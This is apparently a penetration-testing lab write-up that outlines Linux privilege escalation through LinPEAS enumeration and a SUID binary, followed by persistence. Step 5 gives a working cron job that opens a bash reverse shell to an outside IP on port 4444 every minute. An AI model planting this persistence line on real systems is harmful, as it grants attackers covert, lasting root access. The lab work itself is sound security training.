
---

# LAB 3 – Privilege Escalation & Persistence 
```md
# Lab 3 – Privilege Escalation & Persistence Workflow

## Objective
To escalate privileges and maintain persistent access on a compromised system.

## Tools Used
- Meterpreter
- LinPEAS
- PowerSploit

## Step-by-Step Workflow

### Step 1: Initial Shell
Obtain shell from previous exploitation phase.

### Step 2: Enumeration with LinPEAS
```bash
chmod +x linpeas.sh
./linpeas.sh

### Step 3: Identify SUID Binaries

Analyze LinPEAS output for misconfigured SUID files.

### Step 4: Exploitation

Exploit vulnerable SUID binary to gain root access.

### Step 5: Persistence via Cron Job
crontab -e
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/198.162.56.102/4444 0>&1'

### Step 6: Validation

Reboot system

Verify persistent root shell

## Evidence

Root shell screenshot

Cron job configuration

## Outcome

Privilege escalation to root with persistence established.
